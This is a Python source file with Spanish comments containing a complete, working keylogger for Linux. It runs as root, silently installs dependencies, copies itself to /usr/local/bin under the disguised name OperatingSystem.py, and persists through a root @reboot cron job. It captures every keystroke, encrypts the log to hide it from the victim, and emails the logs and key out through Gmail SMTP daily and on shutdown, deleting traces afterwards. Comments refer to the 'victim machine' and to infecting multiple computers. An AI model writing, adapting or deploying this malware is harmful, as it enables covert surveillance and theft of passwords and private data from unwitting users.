#Importamos los modulos necesarios para realizar todas las acciones pertinentes.

import os#Manipular rutas de archivos y hacer operaciones a nivel de sistema operativo.
import sys#Lo mismo que os.
from pynput import keyboard#Captura eventos de teclado.
from datetime import datetime#Gestiona fechas y horas.
from datetime import timedelta#Lo mismo.
import shutil#Permite copiar y mover archivos.
import subprocess#Ejecuta comandos del sistema.
import smtplib#Envia correos usando SMPT.
import signal#Maneja señales del sistema para eventos como el apagado.
import threading#Permite la programacion de tareas concurrentes.
from cryptography.fernet import Fernet#Implementa cifrado AES.
from email.mime.multipart import MIMEMultipart#Todas estas para crear las diferentes partes del correo.
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket#Permite la captura de IP.

#Generamos claves de cifrado AES.
key = Fernet.generate_key()#Crea una clave aleatoria de 32 bits.
cipher_suite = Fernet(key)#Crea un objeto de cifrado para facilitar el cifrado y descifrado.

#Verificamos que tenemos permisos de administrador y si no los tenemos mostramos un mensaje de error y salimos del script.
if os.geteuid() != 0:
    print("[!]This script requires admin privileges to execute.")
    sys.exit(1)

#Funcion para capturar la ip de la maquina victima (necesario en caso de infectar varios equipos).
def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

#Guardamos la ip en la variable de dicho nombre. La necesitaremos mas adelante para formar el nombre del archivo.
ip = get_ip()


#Definimos el array required_packages y metemos todos los paquetes necesarios para que nuestro codigo funcione al ejecutarse.
required_packages = ['pynput', 'cryptography', 'smtplib', 'datetime', 'shutil', 'signal', 'threading', 'email', 'socket']

#Definimos una función para instalar todos esos paquetes en segundo plano redirigiendo la salida estandar y el flujo de errores a la papelera para que no se muestre nada en pantalla.
def install_packages():
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            with open(os.devnull, 'w') as devnull:
                subprocess.Popen(
                        [sys.executable, "-m", "pip", "install", package, "--break-system-packages"],
                        stdout=devnull,
                        stderr=devnull)

#Llamamos a la funcion para instalar los paquetes.
install_packages()

#Definimos una variable para el path actual del codigo.
script_path = os.path.abspath(sys.argv[0])

#Definimos una variable para guardar el path final del script.
destination_path = "/usr/local/bin/OperatingSystem.py"

#Copiamos el archivo en la ubicación final.
shutil.copy(script_path, destination_path)

#Cambiamos los permisos para establecer sticky bit y que solo el root pueda borrarlo. Prefijo 0o para determinar notación octal, 1 para sticky bit y 755 para permisos rwxr-xr-x (rwxr-xr-t).
os.chmod(destination_path, 0o1755)

#Comando para ejecutar keylogger al inicio con cron. @reboot lo ejecuta al encenderse y & indica que debe ejecutarse en segundo plano.
cron_command = f"@reboot {sys.executable} /usr/local/bin/OperatingSystem.py &"

#Añadimos el comando al crontab de root. crontab -l lista las tareas cron, con echo generamos la nueva linea que se debe añadir a cron. El ; se usa para concatenar comandos despues de que el primero haya terminado. | crontab - usa la salida del comando anterior mediante una pipe. Es decir esta linea reemplaza las tareas cron actuales con las tareas actuales mas la nuestra. subprocess.run ejecuta comandos en la terminal, shell true hace que nos aseguramos que la ejecución sea en una bash y check true hace que el codigo solo siga ejecutandose si no hay errores.
#En este caso si que queremos que muestre un mensaje de error ya que eso indicara al usuario que el programa de minado no se podra ejecutar cuando ocurra algun error con las tareas cron (aunque el no sepa por que es).
try:
    subprocess.run("(crontab -l; echo '{}') | crontab -".format(cron_command), shell=True, check=True)
except subprocess.CalledProcessError:
    print("Failed to comply.")
    sys.exit(1)#En caso de error termina el codigo.

#Función para cifrar con AES (Advanced Encryption Standard)
def aes_encrypt(text):
    return cipher_suite.encrypt(text.encode())

#Función para enviar los logs por correo.
def send_email(log_file):
    try:
        #Definimos el email que envia y el email que recibe. Preferentemente dos correos vacios sin informacion personal.
        fromaddr = "myemail@dominio.com"#Correo remitente.
        toaddr = "destinatario@dominio.com"#Correo destinatario.

        key_string = key.decode('utf-8')#Clave de cifrado, para poder mandarla en el asunto del email y que el destinatario (nosotros) pueda descifrar el log.

        #Configuramos la conexión con el servidor SMTP y definimos el mensaje (asunto, cuerpo, adjuntos...).
        msg = MIMEMultipart()#Crea el objeto para poder añadir texto y archivos adjuntos al correo.
        msg['From'] = fromaddr#Indica remitente.
        msg['To'] = toaddr#Indica destinatario.
        msg['Subject'] = f"Log del Key Logger - Clave: {key_string}"#Manda la clave de cifrado en el asunto para que el destinatario (nosotros) pueda descifrarlo.

        body = "Que cabroncete, aquí tienes el log generado:"#Mensaje satirico, porque somos greyhat lesgou hehe >:)
        msg.attach(MIMEText(body, 'plain'))#Convierte el texto a formato MIME (Multipurpose Internet Mail Extensions) para poder mandar contenido multimedia. En este caso es texto plano.

        #Con esto adjuntamos el archivo log.
        attachment = open(log_file, "rb")#Abre el archivo en lectura binaria (rb) para poder leer su contenido.
        part = MIMEBase('application', 'octet-stream')#Crea una nueva parte del mensaje que contenda el archivo adjunto. Octet-stream es el tipo generico de archivos binario de MIME.
        part.set_payload((attachment).read())#Carga el log en esta parte del mensaje.
        encoders.encode_base64(part)#Codifica el contenido del archivo en base64 que es el estandar para email.
        part.add_header('Content-Disposition', "attachment; filename= %s" % log_file)#Crea un encabezado que indica que esta parte es un archivo adjunto y especifica su nombre (el valor de log_file en un determinado equipo un determinado dia a una determinada hora).
        msg.attach(part)#Añade esta parte creada al mensaje.

        #Enviar correo
        server = smtplib.SMTP('smtp.gmail.com', 587)#Establece una conexión con el servidor SMTP de Gmail por el puerto 587, que es el puerto de conexiones seguras mediante STARTTLS.
        server.starttls()
        server.login(fromaddr, "mi contraseña")#Inicia sesion en el servidor con las credenciales que proporcionemos aqui.
        text = msg.as_string()#Convierte todo el correo en una linea de texto MIME.
        server.sendmail(fromaddr, toaddr, text)#Envia el correo.
        server.quit()

        os.remove(log_file)#Elimina el log_file recien enviado para que el programa sea menos detectable.
    except Exception:
        pass#Ignora errores para que no aparezcan en pantalla.


#Definimos la función para enviar log_file en caso de apagado o interrupcion.
def handle_shutdown(signal, frame):
    send_email(log_file)
    sys.exit(0)


#Programamos el envío diario de logs a las 23:59
def send_log_daily():
    global log_file#Importante porque se modifica el valor de log_filecuando no es una variable local, y para que se modifique en todo el script, global.
    now = datetime.now()
    next_run = now.replace(hour=23, minute=59, second=0, microsecond=0)

    #Si ya hemos pasado de las 23:59 definimos el next_run para las 23:59 del nuevo día
    if now >= next_run:
        next_run += timedelta(days=1)#Coge la diferencia de tiempo entre dos puntos.

    delay = (next_run - now).total_seconds()

    threading.Timer(delay, send_log_daily).start()

    log_file = f'/tmp/{ip}_{datetime.now().strftime("%d_%m_%Y_%H:%M")}.log'
    send_email(log_file)


#Definimos el nombre del archivo log que nos enviaremos más tarde, para tenerlos organizados, usaremos datetime de la librería datetime.
log_file = f'/tmp/{ip}_{datetime.now().strftime("%d_%m_%Y_%H:%M")}.log'



  
#Definimos la funcion de logueo de teclas presionadas.
def on_press(key):
    try:
        encrypted_key = aes_encrypt(key.char)#Ciframos cada tecla presionada, para que en caso de intento de lectura por parte del usuario del log_file no se de cuenta de lo que es.
        with open(log_file, "a") as f:
            #En caso de que la tecla presionada sea una tecla normal, escribirá la propia tecla.
            f.write(encrypted_key.decode())
    except AttributeError:
        encrypted_key = aes_encrypt(str(key))#En caso de que sea una tecla especial como shif o control, escribirá el nombre de la tecla, pero encriptado.
        with open(log_file, "a") as f:
            f.write(encrypted_key.decode())


signal.signal(signal.SIGTERM, handle_shutdown)#Intercepta la señal de apagado y llama a la funcion handle_shutdown.
signal.signal(signal.SIGINT, handle_shutdown)#Intercepta la señal de interrupcion y llama a la funcion handle_shutdown.

#Inicia un listener que permanece en escucha.
def main():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

#Ejecuta la funcion main si el script es ejecutado directamente.
send_log_daily()

if __name__ == "__main__":
    main()
